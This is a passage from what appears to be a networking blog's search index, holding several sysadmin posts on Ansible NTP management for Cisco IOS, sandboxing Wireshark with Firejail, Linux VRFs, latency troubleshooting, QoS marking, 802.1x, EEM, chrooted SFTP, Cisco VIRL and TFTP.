SAVE\u0026#34; when: \u0026#34;(remove_summertime.changed == true)\u0026#34; set_fact: configured=true Setting and removing NTP servers Configuration of NTP servers is a little bit complex because we need to manage arrays. Each NTP server must be:\nadded, if missing; removed, if not present in configuration file. - name: \u0026#34;SET NTP SERVER\u0026#34; when: \u0026#34;(item not in get_ntp_config.stdout_lines[3])\u0026#34; with_items: \u0026#34;{{ ntp_servers }}\u0026#34; register: set_ntp_server ios_config: provider: \u0026#34;{{ provider }}\u0026#34; lines: - \u0026#34;{{ item }}\u0026#34; - name: \u0026#34;POSTPONE CONFIGURATION SAVE\u0026#34; when: \u0026#34;(set_ntp_server.changed == true)\u0026#34; set_fact: configured=true - name: \u0026#34;REMOVE NTP SERVER\u0026#34; when: \u0026#34;(item not in ntp_servers)\u0026#34; with_items: \u0026#34;{{ get_ntp_config.stdout_lines[3] }}\u0026#34; register: remove_ntp_server ios_config: provider: \u0026#34;{{ provider }}\u0026#34; lines: - \u0026#34;no {{ item }}\u0026#34; - name: \u0026#34;POSTPONE CONFIGURATION SAVE\u0026#34; when: \u0026#34;(remove_ntp_server.changed == true)\u0026#34; set_fact: configured=true Save Cisco IOS configuration To send a single command, we use ios_command again:\n- name: \u0026#34;SAVE CONFIGURATION\u0026#34; when: \u0026#34;(configured is defined) and (configured == true)\u0026#34; register: save_config ios_command: provider: \u0026#34;{{ provider }}\u0026#34; commands: - \u0026#34;write memory\u0026#34; Mind that write memory do not need any interactive command. Using copy running-config startup-config need a confirm, and currently seems it\u0026rsquo;s not supported by the module.\nRunning the playbook $ ansible-playbook -i hosts --extra-vars \u0026#34;config=etc/ntp_config.yaml secrets=secrets.yaml\u0026#34; ntp_config_ios.yaml PLAY [ios] ********************************************************************* TASK [OBTAIN LOGIN CREDENTIALS] ************************************************ ok: [172.17.0.2] ok: [172.17.0.3] TASK [DEFINE PROVIDER] ********************************************************* ok: [172.17.0.2] ok: [172.17.0.3] TASK [GET NTP CONFIGURATION] *************************************************** ok: [172.17.0.2] ok: [172.17.0.3] TASK [SET TIMEZONE] ************************************************************ skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [SET SUMMERTIME] ********************************************************** skipping: [172.17.0.2] changed: [172.17.0.3] TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [REMOVE SUMMERTIME] ******************************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [SET NTP SOURCE] ********************************************************** skipping: [172.17.0.2] changed: [172.17.0.3] TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] ok: [172.17.0.3] TASK [REMOVE NTP SOURCE] ******************************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [SET NTP SERVER] ********************************************************** skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.1) skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.2) skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.3) skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.4) changed: [172.17.0.3] =\u0026gt; (item=ntp server 1.1.1.1) changed: [172.17.0.3] =\u0026gt; (item=ntp server 1.1.1.2) changed: [172.17.0.3] =\u0026gt; (item=ntp server 1.1.1.3) skipping: [172.17.0.3] =\u0026gt; (item=ntp server 1.1.1.4) TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] ok: [172.17.0.3] TASK [REMOVE NTP SERVER] ******************************************************* skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.1) skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.2) skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.3) skipping: [172.17.0.2] =\u0026gt; (item=ntp server 1.1.1.4) skipping: [172.17.0.3] =\u0026gt; (item=ntp server 1.1.1.4) TASK [POSTPONE CONFIGURATION SAVE] ********************************************* skipping: [172.17.0.2] skipping: [172.17.0.3] TASK [SAVE CONFIGURATION] ****************************************************** skipping: [172.17.0.2] ok: [172.17.0.3] PLAY RECAP ********************************************************************* 172.17.0.2 : ok=3 changed=0 unreachable=0 failed=0 172.17.0.3 : ok=9 changed=3 unreachable=0 failed=0 References My Ansible repository ","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2017/02/17/managing-ntp-on-cisco-ios-with-ansible/","title":"Managing NTP on Cisco IOS with Ansible"},{"categories":["security"],"contents":"Firejail is a powerful tool that can be used to sandbox a lot of applications. By default, Firejail provides profiles for Chrome, Firefox, Telegram, and other famous applications. Wireshark is still missing.\nWe want to limit the interfaces a user can sniff. To be more specific, we want users to capture from bridge interfaces only.\nInstalling Firejail On Ubuntu 16.04 Firejail is available universe repository:\nsudo apt-get -y install firejail All profiles are stored under /etc/firejail/*.profile. We can run a bash using a generic profile:\nfirejail --profile=/etc/firejail/generic.profile bash Wireshark under Firejail Wireshark is a little bit more complicated:\nWireshark calls dumpcap to capture packets without root privileges; dumpcap has few capabilities so every user in the wireshark group has some advanced privileges: # getcap /usr/bin/dumpcap /usr/bin/dumpcap = cap_net_admin,cap_net_raw+eip Let\u0026rsquo;s add a new profile:\n# cat /etc/firejail/wireshark-gtk.profile # Wireshark profile private-bin bash,ls,wireshark-gtk,reordercap,dumpcap,editcap,rawshark,mergecap,text2pcap,capinfos private-dev private-etc fonts,group,gtk-3.0,hosts,machine-id,wiresharck private-tmp noblacklist /bin noblacklist /dev noblacklist /etc noblacklist /home noblacklist /lib noblacklist /lib64 noblacklist /sys noblacklist /tmp noblacklist /usr blacklist /* caps.drop all netfilter noroot seccomp shell none The above profiles:\nmaps all bin and sbin directories importing a few binaries; maps an almost empty /dev directory; maps an almost empty /etc directory; maps an empty /tmp directory; blacklists (disables) all directories except the one required by Wireshark; enforces more the jail. Users must not be part of the wireshark group, or they\u0026rsquo;ll get privileges to capture from any interface. Now add at least one rule for sudo:\n@brcapture ALL=(root) NOPASSWD: /usr/bin/dumpcap -s0 -i br0 -P -w - Mind that dumpcap can capture from multiple interfaces at the same time, so you should not use the * symbol,\nFrom any user in the brcapture group you can now capture packets without any risk;\nsudo /usr/bin/dumpcap -s0 -i br0 -P -w - | firejail wireshark-gtk -n -k -i - If the user stops the capture from the Wireshark UI and tries to start the capture on a different interface, he will get a You don't have permission to capture on that device error. Moreover, if the user will try to browse the filesystem, he will get a Could not read the content error on most of the directories.\nTo check what is inside the Wireshark jail, just try to start a bash using that profile:\nfirejail --profile=/etc/firejail/wireshark-gtk.profile bash For example you will see an almost empty /etc:\n$ ls /etc/ fonts group gtk-3.0 hosts machine-id References Firejail Security Sandbox Desktop / Laptop privacy \u0026amp; security of web browsers on Linux part 2: firejail based sandboxes ","cover":"/blog/2016/12/01/running-wireshark-in-a-jail/sandbox/firejail.webp","permalink":"https://www.adainese.it/blog/2016/12/01/running-wireshark-in-a-jail/sandbox/","title":"Running Wireshark in a jail/sandbox"},{"categories":["security","notes"],"contents":"VRF (Virtual Routing and Forwarding) allows having multiple and separated routing tables on the same system.\nOn Linux, VRF support has been started on 4.3 kernels. Ubuntu 16.04 brings 4.4 kernels but mind that 4.5 kernels have some important patches too.\nThis post will show how to create two different VRFs, one dedicated to a virtual bridge. On each virtual bridge, a virtual router is running. The VM used for the tests below is a Ubuntu 16,.04 installed with EVE-NG.\nCreate a VRF Two VRFs will be created:\nip link add red type vrf table 1 ip link add green type vrf table 2 Don\u0026rsquo;t forget to bring both up:\nip link set dev red up ip link set dev green up # ip -br link show type vrf red UNKNOWN 9a:ca:96:75:f8:f5 \u0026lt;NOARP,MASTER,UP,LOWER_UP\u0026gt; green UNKNOWN 8e:b6:6f:25:64:10 \u0026lt;NOARP,MASTER,UP,LOWER_UP\u0026gt; Assign a Network Interface to a VRF An EVE-NG switch will be assigned to each VRF:\nip link set vnet0_1 master red ip link set vnet0_2 master green # ip link show vnet0_1 3: vnet0_1: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9000 qdisc noqueue master red state UP mode DEFAULT group default qlen 1000 link/ether ae:81:73:24:b5:66 brd ff:ff:ff:ff:ff:ff # ip link show vnet0_2 8: vnet0_2: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 9000 qdisc noqueue master green state UP mode DEFAULT group default qlen 1000 link/ether 0a:9d:e0:76:8b:84 brd ff:ff:ff:ff:ff:ff Set FIB rules Prior to the v4.8 kernel, some additional rules must be added to properly forward traffic on interfaces:\nip rule add iif red table 1 ip rule add oif red table 1 ip rule add iif green table 2 ip rule add oif green table 2 # ip rule show 0: from all lookup local 32762: from all oif green lookup 2 32763: from all iif green lookup 2 32764: from all oif red lookup 1 32765: from all iif red lookup 1 32766: from all lookup main 32767: from all lookup default IP configuration An IP address and a default route will be assigned to each virtual bridge and VRF:\nip addr add 10.254.0.1/24 dev vnet0_1 ip addr add 10.254.0.1/24 dev vnet0_2 ip route add 0.0.0.0/0 via 10.254.0.2 table 1 ip route add 0.0.0.0/0 via 10.254.0.2 table 2 Connectivity test Both virtual routers connected to virtual bridges are configured as follows:\nR1: e0/0:10.254.0.2/24 lo0:1.1.1.1/32 . R2: e0/0:10.254.0.2/24 lo0:2.2.2.2/32 Remember to bind ping (and traceroute) to an interface assigned to the VRF:\n# ping -I vnet0_1 -c5 10.254.0.2 PING 10.254.0.2 (10.254.0.2) from 10.254.0.1 vnet0_1: 56(84) bytes of data. 64 bytes from 10.254.0.2: icmp_seq=1 ttl=255 time=0.434 ms [...] # ping -I vnet0_2 -c5 10.254.0.2 PING 10.254.0.2 (10.254.0.2) from 10.254.0.1 vnet0_2: 56(84) bytes of data. 64 bytes from 10.254.0.2: icmp_seq=1 ttl=255 time=0.649 ms [...] Local networks are reachable, now test the routing:\n# ping -I vnet0_1 -c5 1.1.1.1 PING 1.1.1.1 (1.1.1.1) from 10.254.0.1 vnet0_1: 56(84) bytes of data. 64 bytes from 1.1.1.1: icmp_seq=1 ttl=255 time=0.649 ms [...] # ping -I vnet0_2 -c5 2.2.2.2 PING 2.2.2.2 (2.2.2.2) from 10.254.0.1 vnet0_2: 56(84) bytes of data. 64 bytes from 2.2.2.2: icmp_seq=1 ttl=255 time=0.452 ms [...] Current limits VRF support on Linux is quite new, so there are many limits:\nmost of the applications cannot be VRF aware, even if local services can listen at all VRF (sysctl -w net.ipv4.tcp_l3mdev_accept=1 with 4.5 kernels); there is no way to start a client command (telnet, ftp, ssh, \u0026hellip;) using a specific VRF. Edit: currently a command can be executed and \u0026ldquo;attached\u0026rdquo; to a specific VRF using: ip vrf exec blue ping 8.8.8.8\nReferences Virtual Routing and Forwarding (VRF) Operationalizing VRF in the Data Center VRF for Linux (Cumulus Networks) ","cover":"/images/vendors/linux.webp","permalink":"https://www.adainese.it/blog/2016/11/29/vrfs-on-linux/","title":"VRFs on Linux"},{"categories":["infrastructure"],"contents":"In this case, the application team is reporting a random high RTT between a client and a server. Both client and server are Linux virtual machines, under VMware vSphere, and the path is through a lot of firewalls, routers, switches, load balancers\u0026hellip; and so on.\nThe issue The very first thing is to replicate the issue from the client:\nPORT=6000; while true; do echo -ne \u0026#34;${PORT} \u0026#34;; nmap -n -g ${PORT} -p 143 10.0.1.1 | grep scanned; PORT=$((${PORT} + 1)); done After a while I could see some requests going over one second:\n6000 Nmap finished: 1 IP address (1 host up) scanned in 0.119 seconds 6001 Nmap finished: 1 IP address (1 host up) scanned in 0.119 seconds 6002 Nmap finished: 1 IP address (1 host up) scanned in 0.119 seconds 6003 Nmap finished: 1 IP address (1 host up) scanned in 0.116 seconds 6004 Nmap finished: 1 IP address (1 host up) scanned in 0.118 seconds 6005 Nmap finished: 1 IP address (1 host up) scanned in 3.861 seconds 6006 Nmap finished: 1 IP address (1 host up) scanned in 0.116 seconds 6007 Nmap finished: 1 IP address (1 host up) scanned in 0.119 seconds 6008 Nmap finished: 1 IP address (1 host up) scanned in 0.128 seconds 6009 Nmap finished: 1 IP address (1 host up) scanned in 0.113 seconds The issue is now confirmed. Before continuing, be sure the client and server have both clocks synchronized.\nclient# clock Fri 05 Feb 2016 12:28:57 PM CET -0.016003 seconds server# clock Fri 05 Feb 2016 12:26:57 PM CET -0.347022 seconds Supposing the network is stale and deterministic, the next step will require checking the end-to-end path on both client and server:\nclient# tcpdump -i eth0 -s 0 -nn -w /tmp/dump.pcap host 10.0.2.2 and portrange 6000-6999 and host 10.0.1.1 and port 143 server# tcpdump -i eth0 -s 0 -nn -w /tmp/dump.pcap host 10.0.2.2 and portrange 6000-6999 and host 10.0.1.1 and port 143 The source port is set to a fixed number so the tcpdump filter can be configured to match test requests only.\nAfter a couple of requests with high latency, both tcpdump can be stopped and analyzed.\nLet\u0026rsquo;s review some high latency requests:\n6007 Nmap finished: 1 IP address (1 host up) scanned in 3.285 seconds 6089 Nmap finished: 1 IP address (1 host up) scanned in 2.911 seconds 6200 Nmap finished: 1 IP address (1 host up) scanned in 4.025 seconds Let\u0026rsquo;s dump the request with source port 6088 on the client:\nclient# tcpdump -r /tmp/dump.pcap -nn \u0026#34;port 6200 and tcp[tcpflags] \u0026amp; (tcp-syn) != 0\u0026#34; reading from file /tmp/dump.pcap, link-type EN10MB (Ethernet) 12:35:02.639543 IP 10.0.2.2.6200 \u0026gt; 10.0.1.1.143: S 2917316624:2917316624(0) win 2048 \u0026lt;mss 1460\u0026gt; 12:35:02.640273 IP 10.0.1.1.143 \u0026gt; 10.0.2.2.6200: S 2145376395:2145376395(0) ack 2917316625 win 5840 \u0026lt;mss 1460\u0026gt; server# tcpdump -r /tmp/dump.pcap -nn \u0026#34;port 6200 and tcp[tcpflags] \u0026amp; (tcp-syn) != 0\u0026#34; reading from file /tmp/dump.pcap, link-type EN10MB (Ethernet) 12:35:02.635480 IP 10.0.2.2.6200 \u0026gt; 10.0.1.1.143: S 2917316624:2917316624(0) win 2048 \u0026lt;mss 1460\u0026gt; 12:35:02.635488 IP 10.0.1.1.143 \u0026gt; 10.0.2.2.6200: S 2145376395:2145376395(0) ack 2917316625 win 5840 \u0026lt;mss 1460\u0026gt; So, we have the following timeline:\n12:34:29.573249 client sends the SYN packet 12:34:29.569671 server receives the SYN packet 12:34:29.569686 server send back the SYN+ACK packet 12:34:29.574055 client receive the SYN+ACK packet Besides a slight clock misalignment, all packets were sent and received back in less than 3 milliseconds. So the network is not the cause of the latency. The cause is the source host, spending time managing processes.\n","cover":"/images/categories/infrastructure.webp","permalink":"https://www.adainese.it/blog/2016/02/05/analyzing-a-network-performance-issue/","title":"Analyzing a network performance issue"},{"categories":["infrastructure"],"contents":"A not-so-easy process about QoS involves the verification of end-to-end QoS marking: are the marks maintained through the all network?\nBefore going deep, let\u0026rsquo;s recap how an IP packet can be marked:\nThe IP field reserved for QoS is 8 bits long and it\u0026rsquo;s called TOS (Type of Service). RFC791 defines 3 bits for IPP (IP Precedence) and 3 bit for traffic characteristics (Delay, Throughput and Reliability). 2 MBZ bits (Must Be Zero). RFC1349 updates RFC791 and define 3 bits for IPP, 4 bits for TOS (Delay, Throughput, Reliability and Cost) and 1 MBZ bit. In this RFC \u0026ldquo;Type of Service\u0026rdquo; is referred to as the 8 bits field in the IP header, and \u0026ldquo;TOS\u0026rdquo; is referred to as the 4 bits field inside the 8 bits \u0026ldquo;Type of Service\u0026rdquo; field. RFC2474 defines another way to use the ToS field: 6 bits for DSCP and 2 MBZ bits. RFC4594 defines how DCP bits can be used: DF (Default Forwarding), AF (Assured Forwarding), EF (Expedited Forwarding), or CS (Class Selector). More QoS-related RFC exists, but they are out of the scope of this very short document.\nToS (int) ToS (hex) ToS (bin) IPP TOS DSCP (PHB) DSCP (int) DSCP (bin) 0 0x0 000 000 0 0 0 - Routine 0000 - Normal Service DF (CS0) 0 000000 32 0x20 001 000 0 0 1 - Priority 0000 - Normal Service CS1 8 001000 40 0x28 001 010 0 0 1 - Priority 0100 - Maximize Throughput AF11 10 001010 48 0x30 001 100 0 0 1 - Priority 1000 - Minimize Delay AF12 12 001100 56 0x38 001 110 0 0 1 - Priority 1100 - Minimize Delay and Maximize Throughput AF13 14 001110 64 0x40 010 000 0 0 2 - Immediate 0000 - Normal Service CS2 16 010000 72 0x48 010 010 0 0 2 - Immediate 0100 - Maximize Throughput AF21 18 010010 80 0x50 010 100 0 0 2 - Immediate 1000 - Minimize Delay AF22 20 010100 88 0x58 010 110 0 0 2 - Immediate 1100 - Minimize Delay and Maximize Throughput AF23 22 010110 96 0x60 011 000 0 0 3 - Flash 0000 - Normal Service CS3 24 011000 104 0x68 011 010 0 0 3 - Flash 0000 - Normal Service AF31 26 011010 112 0x70 011 100 0 0 3 - Flash 1000 - Minimize Delay AF32 28 011100 120 0x78 011 110 0 0 3 - Flash 1100 - Minimize Delay and Maximize Throughput AF33 30 011110 128 0x80 100 000 0 0 4 - Flash Override 0000 - Normal Service CS4 32 100000 136 0x88 100 010 0 0 4 - Flash Override 0000 - Normal Service AF41 34 100010 144 0x90 100 100 0 0 4 - Flash Override 1000 - Minimize Delay AF42 36 100100 152 0x98 100 110 0 0 4 - Flash Override 1100 - Minimize Delay and Maximize Throughput AF43 38 100110 160 0xa0 101 000 0 0 5 - CRITIC/ECP 0000 - Normal Service CS5 40 101000 184 0xb8 101 110 0 0 5 - CRITIC/ECP 1100 - Minimize Delay and Maximize Throughput EF 46 101110 192 0xc0 110 000 0 0 6 - Internetwork Control 0000 - Normal Service CS6 48 110000 224 0xe0 111 000 0 0 7 - Network Control 0000 - Normal Service CS7 56 111000 Within the same AF class, higher DSCPs have a higher drop probability (AFX1 = low, AFX2 = medium, AFX3 = high). Lower AF class should have a low drop probability (AF1X \u0026lt; AF2X \u0026lt; AF3X \u0026lt; AF4X).\nIPP and TOS are no more used, but for completeness here is the TOS table:\nTOS Service 0 0 0 0 Normal Service X X X 1 Minimize Monetary Cost X X 1 X Maximize Reliability X 1 X X Maximize Throughput 1 X X X Minimize Delay Why so many values? Currently DSCP is the most used QoS model, but each network tool can take input using a specific format.\nAnalyzing packets Let\u0026rsquo;s assume we want to check if received packets are correctly marketed. We want to analyze EF and AF1 classes. On Linux, tcpdump takes decimal ToS values:\nsudo tcpdump -n -v \u0026#39;icmp and (ip[1] \u0026amp; 0xfc == 184 or ip[1] \u0026amp; 0xfc == 56 or ip[1] \u0026amp; 0xfc == 48 or ip[1] \u0026amp; 0xfc == 40)\u0026#39; The Linux ping command also takes decimal ToS:\nping -Q 184 Cisco routers take the binary ToS:\n#ping Protocol [ip]: Target IP address: 2.2.2.2 Repeat count [5]: Datagram size [100]: Timeout in seconds [2]: Extended commands [n]: y Source address or interface: Loopback0 Type of service [0]: 0xb8 Set DF bit in IP header? [no]: Validate reply data? [no]: Data pattern [0xABCD]: Loose, Strict, Record, Timestamp, Verbose[none]: Sweep range of sizes [n]: ","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2014/09/04/verifying-end-to-end-qos-marking/","title":"Verifying end-to-end QoS marking"},{"categories":["notes"],"contents":"A very short post about 802.1x (dot1x) on Cisco Catalyst 2950 series. Configure RADIUS and enable dot1x on the switch:\naaa authentication dot1x default group radius aaa accounting dot1x default start-stop group radius dot1x system-auth-control Then enable dot1x on all interfaces (additional security commands are added in the example below):\ninterface FastEthernet0/1 switchport mode access switchport nonegotiate switchport port-security maximum 5 switchport port-security switchport port-security aging time 5 switchport port-security violation restrict switchport port-security aging type inactivity dot1x port-control auto dot1x timeout tx-period 2 dot1x guest-vlan 666 dot1x auth-fail vlan 666 no cdp enable spanning-tree portfast spanning-tree bpduguard enable Additional notes:\nBe sure you have the latest IOS (c2950-i6k2l2q4-mz.121-22.EA14.bin) or an unauthorized port won\u0026rsquo;t learn the PC\u0026rsquo;s MAC address. ","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2014/07/17/802.1x-on-cisco-catalyst-2950/","title":"802.1x on Cisco Catalyst 2950"},{"categories":["automation"],"contents":"My Internet connection is cheap enough and a little bit crappy. Cisco provides Embedded Event Manager (EEM), useful to manage a situation like mine:\nevent manager applet RESTART_ATM event interface name \u0026#34;ATM0\u0026#34; parameter input_errors_crc entry-val 3000 entry-op gt entry-val-is-increment true exit-comb or exit-val 1 exit-op le exit-val-is-increment true exit-time 5 poll-interval 3600 maxrun 10 action 1.0 cli command \u0026#34;enable\u0026#34; action 1.1 cli command \u0026#34;configure terminal\u0026#34; action 1.2 cli command \u0026#34;interface ATM0\u0026#34; action 1.3 cli command \u0026#34;shutdown\u0026#34; action 1.4 cli command \u0026#34;yes\u0026#34; action 1.5 cli command \u0026#34;no shutdown\u0026#34; action 1.6 cli command \u0026#34;end\u0026#34; action 1.7 syslog priority warnings msg \u0026#34;ATM0 restarted by EEM\u0026#34; In this case EEM will be triggered when an interface event occurs:\ninterface selected is ATM0 (interface name \u0026ldquo;ATM0\u0026rdquo;); input CRC counter (parameter input_errors_crc) is always incremented (entry-val-is-increment true), so a delta must be analyzed not absolute value: applet starts when counter is incremented by 3000 (entry-val 3000 entry-op gt); applet ends immediately: when counter is incremented by less than one unit (exit-val 1 exit-op le exit-val-is-increment true); or (exit-comb or) after 5 seconds (exit-time 5); interface counter is polled every hour (poll-interval); applet will be killed after 10 seconds (maxrun 10). When the interface is restarted a syslog message is printed.\n#show log | i EEM 007064: Mar 4 12:11:55.343 CET: %SYS-5-CONFIG_I: Configured from console by on vty1 (EEM:RESTART_ATM) 007065: Mar 4 12:11:55.395 CET: %HA_EM-4-LOG: RESTART_ATM: ATM0 restarted by EEM 007083: Mar 4 12:16:55.344 CET: %SYS-5-CONFIG_I: Configured from console by on vty0 (EEM:RESTART_ATM) 007084: Mar 4 12:16:55.396 CET: %HA_EM-4-LOG: RESTART_ATM: ATM0 restarted by EEM 007106: Mar 4 12:21:55.350 CET: %SYS-5-CONFIG_I: Configured from console by on vty1 (EEM:RESTART_ATM) 007107: Mar 4 12:21:55.402 CET: %HA_EM-4-LOG: RESTART_ATM: ATM0 restarted by EEM 007272: Mar 4 13:29:37.821 CET: %SYS-5-CONFIG_I: Configured from console by on vty0 (EEM:RESTART_ATM) 007273: Mar 4 13:29:37.873 CET: %HA_EM-4-LOG: RESTART_ATM: ATM0 restarted by EEM 008559: Mar 5 18:29:40.154 CET: %SYS-5-CONFIG_I: Configured from console by on vty0 (EEM:RESTART_ATM) 008560: Mar 5 18:29:40.230 CET: %HA_EM-4-LOG: RESTART_ATM: ATM0 restarted by EEM References Cisco IOS Embedded Event Manager Command Reference ","cover":"/images/vendors/cisco.webp","permalink":"https://www.adainese.it/blog/2014/03/06/restart-dsl-connection-on-a-crc-threshold-using-eem/","title":"Restart DSL connection on a CRC threshold using EEM"},{"categories":["notes"],"contents":"OpenSSH allows SSH/SFTP users to connect to the whole system by default. In many cases this is not the expected behavior: users should be relegated to the home their home directory only.\nSometimes this is called \u0026ldquo;Chrooted SFTP\u0026rdquo;.\nAs we discussed before, SFTP users can see the whole system by default:\n# sftp andrea@localhost Connecting to localhost... andrea@localhost\u0026#39;s password: sftp\u0026gt; pwd Remote working directory: /home/andrea Users can be confined to changing the SFTP backend:\n# /etc/ssh/sshd_config [...] #Subsystem sftp /usr/libexec/openssh/sftp-server Subsystem sftp internal-sftp [...] Users part of the webmaster group should only access the webserver directory; other users should be restricted to their home directory:\n# /etc/ssh/sshd_config [...] Match User webmaster ChrootDirectory /var/www/html AllowTCPForwarding no X11Forwarding no ForceCommand internal-sftp Match Group users ChrootDirectory /home AllowTCPForwarding no X11Forwarding no ForceCommand internal-sftp [...] Now users are restricted and cannot leave the configured directory:\nandrea@localhost\u0026#39;s password: sftp\u0026gt; pwd Remote working directory: / Enabling a restricted SSH is more complicated: SSH needs many components like BASH, libraries, and so on. The reason is simple: if a user enters a confined environment, it cannot access components outside the confined environment. All required components must be copied to the path where users are \u0026ldquo;chrooted\u0026rdquo;.\n","cover":"/images/vendors/linux.webp","permalink":"https://www.adainese.it/blog/2014/02/24/chrooted-sftp/","title":"Chrooted SFTP"},{"categories":["unetlab"],"contents":"In last Cisco Live 2014 (Milan) there was a lab on Cisco VIRL/CML. Only one PC located in the Walk-in-lab room was available to start a VIRL lab, and I couldn\u0026rsquo;t miss that chance to see what exactly VIRL is. The following post is what I could understand using a VIRL/CML installation during the latest Cisco Live 2014 (Milan).\nDisclaimer: in this post, there are many \u0026ldquo;facts\u0026rdquo; and also many personal \u0026ldquo;guesses\u0026rdquo;. Things can change, VIRL/CML is not available yet, so everything is evolving.\nVIRL/CML is not IOU I can suppose that all readers know what IOU is. By the way let me recap the differences between GNS3, Dynamips, Dynagen, IOU/IOL, and iou-web:\nDynamips Source Code emulates Cisco routers. That means that Dynamips emulates the hardware so a standard IOS can be executed upon it. Dynamips supports both serial and Ethernet interfaces. Dynagen is a text-based front-end for Dynamips. GNS3 : is a graphical front-end for Dynamips. IOU (IOS on Unix) emulates Cisco IOS: it\u0026rsquo;s an executable file that runs under Sparc/Solaris platform. There is also IOL (IOS on Linux) which runs on x86/Linux platform, and there is should another version that runs on Mac OS platform. IOU supports both serial and Ethernet interfaces. There are also IOU/IOL images that supports a limited subset of Layer 2 features. iou-web is a web front-end for IOL (it should work also on Sparc/Solaris, but I never tested it). XR4U (XR for Unix): it should emulate Cisco IOS-XR on Unix/Linux platform, I have never seen it runs. Cisco VIRL (Virtual Internet Routing Lab) is the old name of Cisco Modeling Lab (CML). It\u0026rsquo;s a graphical front-end for Cisco virtualized appliances. Currently, VIRL supports:\nCisco Cloud Services Router 1000V Series : based on IOS-XE it runs 3 GigabitEthernet interfaces and requires about 2Gb of RAM (different versions have different requirements). vIOS: it should require fewer resources than CSR1000v, it\u0026rsquo;s not available for download yet. Cisco IOS XRv : based on IOS-XR it should available for download soon. Ubuntu Linux: it\u0026rsquo;s a simply Ubuntu Linux Virtual Machine that serves as a server. All of them are Virtual Machines running x86/x86_64 code.\nThe main differences between VIRL and IOU are now evident:\nVIRL is not based on IOU, VIRL needs Virtual Machines; VIRL won\u0026rsquo;t support serial interfaces, only Ethernet interfaces will be supported; L2 images are not supported, and maybe they won\u0026rsquo;t be supported in the future (explained later). What exactly is Cisco VIRL/CML? Cisco VIRL/CML is a graphical interface to create and manage labs based on virtual/cloud devices. Technically VIRL/CML is based on:\nOpenStack and Linux KVM : KVM is the hypervisor who runs Virtual Machines, and OpenStack is the manger. Eclipse ; don\u0026rsquo;t know it\u0026rsquo;s a Java app or not. Autonetkit : it can automatically allocate IP addresses, configure routing and generate configuration files with templates. Let me clarify: Cisco VIRL/CML is a graphical front-end (like GNS3) that can create labs using x86 images using OpenStack/KVM. It\u0026rsquo;s faster than Dynamips, and more flexible than IOU/IOL, but it supports only L3 Ethernet interfaces. The reason is pretty simple: L2 switches are provided by OpenStack/KVM layer.\nMy opinion is that L2 interfaces could be supported if an L2 IOS is installed within the OpenStack/KVM suite: like Nexus 1000V is installed within the VMware vSphere suite.\nSerial interfaces could be supported also (using classic COM/TTYSx ports), but because VIRL/CML is based on production cloud devices, I suppose we\u0026rsquo;ll never see L2 or serial interfaces on VIRL/CML.\nThe good news is that VIRL/CML could support all cloud devices Cisco will make available:\nCisco Virtual Wide Area Application Services (vWAAS) Cisco Virtual Wireless Controller Cisco ASA 1000V Cloud Firewall But VIRL/CML could support also:\na different type of Linux appliances: Ubuntu is already supported; other\u0026rsquo;s vendor appliances like NetScaler, Imperva, SourceFire\u0026hellip; When VIRL/CML will be released? Cisco VIRL/CML seems pretty but not completely stable: I can make it crash a couple of times during my test. Rumors say that VIRL/CML will be released not before the end of 2014: someone refers to marketing problems, someone refers to a technical problem.\nIt\u0026rsquo;s pretty sure that VIRL/CML will be available as OVF/OVA Virtual Machine but also as a bare metal installation (a whole server dedicated to VIRL/CML).\nUpdate (2014-04-29): Cisco Modeling Labs will be released by late Summer 2014:\nQ. Is there a hosted or cloud offering? A. No, there is no hosted or cloud offering. Q. How do customers purchase Cisco Modeling Labs? A. The corporate edition will be on the global price list and orderable on the Cisco Commerce Workspace at Cisco.com by late summer 2014.\nUpdate (2014-05-22): Cisco Modeling Labs will be released before the end of July 2014 ( Daniel\u0026rsquo;s blog ).\nReferences Cisco’s Virtual Internet Routing Lab – When? by Brian Dennis Cisco Modeling Lab (VIRL) behind the scenes by Ivan Pepelnjak Response: Cisco Modeling Lab (VIRL) Behind the Scenes by Greg Ferro Cisco Modeling Labs Cisco Modeling Labs 1.0 Corporate Edition Cisco Modeling Labs FAQ ","cover":"/blog/2014/02/03/what-is-cisco-virl/cml/virl.webp","permalink":"https://www.adainese.it/blog/2014/02/03/what-is-cisco-virl/cml/","title":"What is Cisco VIRL/CML?"},{"categories":["notes"],"contents":"TFTP or Trivial File Transfer Protocol is a simple file transfer protocol. TFTP uses UDP port 69, no authentication or encryption is supported, and directory navigation is not possible. Three file transfer methods are available: netascii (or ASCII for text files), octet (or image for binary files), and mail (not used anymore).\nA TFTP client sends to the server a read request (RRW or Read ReQuest) or a written request (WRQ or Write ReQuest) using UDP protocol; the destination port is 69 and the source port is random (X). The TFTP server answers to the client with an ACK using a random source port (Y). Next data transfer will use only UDP ports X and Y (port 69 is not used anymore); each sent data packet (DAT) will be acknowledged (ACK).\nClient From an IOS device, TFTP can be used as a \u0026ldquo;redirection\u0026rdquo; destination:\nshow tech-support | redirect tftp://192.168.10.1/Router_tech-support-20120819 TFTP can be used also to transfer files from and to the server:\ncopy 